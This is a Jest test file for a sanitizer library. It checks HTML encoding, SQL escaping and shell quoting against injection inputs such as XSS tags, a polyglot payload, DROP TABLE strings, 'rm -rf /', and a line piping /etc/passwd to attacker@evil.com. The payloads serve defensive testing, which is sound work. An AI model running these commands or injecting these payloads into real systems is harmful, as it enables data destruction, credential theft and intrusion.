/**
 * Tests for integrated security libraries
 *
 * This test file verifies that our trusted library integrations
 * work correctly and provide the expected security benefits.
 */

const { describe, it, expect } = require('@jest/globals');
const { htmlEncode } = require('../../src/utils/string-utils');
const { SQLValidator } = require('../../src/sanitizer/validators/sql');
const { CommandValidator } = require('../../src/sanitizer/validators/command');

describe('Security Library Integration Tests', () => {
  describe('escape-html Integration', () => {
    it('should properly escape HTML entities', () => {
      const dangerous = '<script>alert("XSS")</script>';
      const escaped = htmlEncode(dangerous);
      expect(escaped).toBe('&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;');
    });

    it('should handle all OWASP recommended entities', () => {
      const input = '& < > " \' / =';
      const escaped = htmlEncode(input);
      expect(escaped).toBe('&amp; &lt; &gt; &quot; &#39; / ='); // escape-html uses &#39; instead of &#x27;
    });

    it('should handle edge cases', () => {
      expect(htmlEncode('')).toBe('');
      expect(htmlEncode('normal text')).toBe('normal text');
      expect(htmlEncode('multi\nline\ntext')).toBe('multi\nline\ntext');
    });

    it('should throw on non-string input', () => {
      expect(() => htmlEncode(null)).toThrow('Input must be a string');
      expect(() => htmlEncode(123)).toThrow('Input must be a string');
      expect(() => htmlEncode({})).toThrow('Input must be a string');
    });

    it('should handle very long strings efficiently', () => {
      const longString = '<'.repeat(10000);
      const start = Date.now();
      const escaped = htmlEncode(longString);
      const duration = Date.now() - start;

      expect(escaped).toBe('&lt;'.repeat(10000));
      expect(duration).toBeLessThan(100); // Should be very fast
    });
  });

  describe('sqlstring Integration', () => {
    let sqlValidator;

    beforeEach(() => {
      sqlValidator = new SQLValidator();
    });

    it('should escape SQL values correctly', () => {
      const dangerous = "'; DROP TABLE users; --";
      const escaped = sqlValidator.escapeValue(dangerous);
      expect(escaped).toBe("'\\'; DROP TABLE users; --'");
    });

    it('should escape SQL identifiers correctly', () => {
      const identifier = 'user`table';
      const escaped = sqlValidator.escapeIdentifier(identifier);
      expect(escaped).toBe('`user``table`');
    });

    it('should format SQL queries safely', () => {
      const query = 'SELECT * FROM users WHERE name = ? AND age > ?';
      const values = ["Robert'; DROP TABLE students; --", 25];
      const formatted = sqlValidator.format(query, values);
      expect(formatted).toBe("SELECT * FROM users WHERE name = 'Robert\\'; DROP TABLE students; --' AND age > 25");
    });

    it('should handle null and undefined values', () => {
      expect(sqlValidator.escapeValue(null)).toBe('NULL');
      expect(sqlValidator.escapeValue(undefined)).toBe('NULL');
    });

    it('should handle boolean values', () => {
      expect(sqlValidator.escapeValue(true)).toBe('true');
      expect(sqlValidator.escapeValue(false)).toBe('false');
    });

    it('should handle arrays', () => {
      const arr = [1, 2, 'three'];
      const escaped = sqlValidator.escapeValue(arr);
      expect(escaped).toBe("1, 2, 'three'");
    });

    it('should handle dates', () => {
      const date = new Date('2023-01-01T00:00:00.000Z');
      const escaped = sqlValidator.escapeValue(date);
      // Note: Date formatting depends on timezone
      expect(escaped).toMatch(/^'\d{4}-\d{2}-\d{2}/); // Matches date format
    });
  });

  describe('shell-quote Integration', () => {
    let commandValidator;

    beforeEach(() => {
      commandValidator = new CommandValidator();
    });

    it('should quote command arguments safely', () => {
      const args = ['echo', 'hello world', '; rm -rf /'];
      const quoted = commandValidator.quote(args);
      expect(quoted).toBe("echo 'hello world' '; rm -rf /'");
    });

    it('should parse command strings correctly', () => {
      const cmd = 'ls -la "/home/user/my documents"';
      const parsed = commandValidator.parse(cmd);
      expect(parsed).toEqual(['ls', '-la', '/home/user/my documents']);
    });

    it('should build safe commands', () => {
      const command = 'grep';
      const args = ['-r', 'password', '/etc/*'];
      const safe = commandValidator.buildSafeCommand(command, args);
      // shell-quote escapes wildcards differently
      expect(safe).toBe('grep -r password /etc/\\*');
    });

    it('should handle shell metacharacters', () => {
      const dangerous = ['echo', '$(whoami)', '`id`', '| cat /etc/passwd'];
      const quoted = commandValidator.quote(dangerous);
      // shell-quote escapes shell metacharacters with backslashes
      expect(quoted).toBe('echo \\$\\(whoami\\) \\`id\\` \'| cat /etc/passwd\'');
    });

    it('should handle empty arguments', () => {
      const args = ['echo', '', 'test'];
      const quoted = commandValidator.quote(args);
      expect(quoted).toBe("echo '' test");
    });

    it('should handle special characters in arguments', () => {
      const args = ['echo', '$PATH', '~/*', '&&', 'ls'];
      const quoted = commandValidator.quote(args);
      // shell-quote escapes special chars with backslashes
      expect(quoted).toBe('echo \\$PATH ~/\\* \\&\\& ls');
    });

    it('should throw on invalid input', () => {
      expect(() => commandValidator.quote('not an array')).toThrow('Arguments must be an array');
      expect(() => commandValidator.parse(123)).toThrow('Command must be a string');
      expect(() => commandValidator.buildSafeCommand('')).toThrow('Command must be a non-empty string');
    });

    it('should handle environment variable expansion in parse', () => {
      const cmd = 'echo $HOME';
      const env = { HOME: '/home/user' };
      const parsed = commandValidator.parse(cmd, env);
      expect(parsed).toEqual(['echo', '/home/user']);
    });
  });

  describe('Cross-library Security Scenarios', () => {
    it('should prevent SQL injection through multiple layers', async () => {
      const sqlValidator = new SQLValidator();
      const userInput = "admin'; DROP TABLE users; --";

      // First layer: validation
      const validationResult = await sqlValidator.validate(userInput);
      expect(validationResult.isValid).toBe(false);
      expect(validationResult.warnings.length).toBeGreaterThan(0);

      // Second layer: escaping
      const escaped = sqlValidator.escapeValue(userInput);
      // sqlstring escapes but doesn't remove content
      expect(escaped).toContain('DROP TABLE'); // Content is escaped, not removed
      expect(escaped).toBe("'admin\\'; DROP TABLE users; --'");
    });

    it('should prevent command injection through multiple layers', async () => {
      const commandValidator = new CommandValidator();
      const userInput = 'cat /etc/passwd | mail attacker@evil.com';

      // First layer: validation
      const validationResult = await commandValidator.validate(userInput);
      expect(validationResult.isValid).toBe(false);
      expect(validationResult.warnings.length).toBeGreaterThan(0);

      // Second layer: safe command building
      const safeArgs = commandValidator.parse(userInput);
      const safeCmd = commandValidator.quote(safeArgs);
      expect(safeCmd).not.toBe(userInput);
    });

    it('should handle polyglot payloads', () => {
      const polyglot = 'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>'; // eslint-disable-line no-script-url

      // HTML encoding should neutralize it
      const htmlSafe = htmlEncode(polyglot);
      expect(htmlSafe).not.toContain('<svg');
      // escape-html encodes but doesn't remove attributes
      expect(htmlSafe).toContain('onload='); // Encoded but present

      // SQL escaping should neutralize it
      const sqlValidator = new SQLValidator();
      const sqlSafe = sqlValidator.escapeValue(polyglot);
      expect(sqlSafe).toMatch(/^'.*'$/);

      // Command escaping should neutralize it
      const commandValidator = new CommandValidator();
      const cmdSafe = commandValidator.quote([polyglot]);
      // shell-quote may use double quotes for complex strings
      expect(cmdSafe).toMatch(/^["'].*["']$/); // Can be single or double quotes
    });
  });

  describe('Performance Benchmarks', () => {
    it('should perform HTML encoding quickly', () => {
      const iterations = 10000;
      const testString = '<script>alert("test")</script>';

      const start = Date.now();
      for (let i = 0; i < iterations; i++) {
        htmlEncode(testString);
      }
      const duration = Date.now() - start;

      const avgTime = duration / iterations;
      expect(avgTime).toBeLessThan(0.1); // Less than 0.1ms per operation
    });

    it('should perform SQL escaping quickly', () => {
      const iterations = 10000;
      const sqlValidator = new SQLValidator();
      const testString = "'; DROP TABLE users; --";

      const start = Date.now();
      for (let i = 0; i < iterations; i++) {
        sqlValidator.escapeValue(testString);
      }
      const duration = Date.now() - start;

      const avgTime = duration / iterations;
      expect(avgTime).toBeLessThan(0.1); // Less than 0.1ms per operation
    });

    it('should perform command quoting quickly', () => {
      const iterations = 10000;
      const commandValidator = new CommandValidator();
      const testArgs = ['echo', 'test', '| cat /etc/passwd'];

      const start = Date.now();
      for (let i = 0; i < iterations; i++) {
        commandValidator.quote(testArgs);
      }
      const duration = Date.now() - start;

      const avgTime = duration / iterations;
      expect(avgTime).toBeLessThan(0.1); // Less than 0.1ms per operation
    });
  });
});
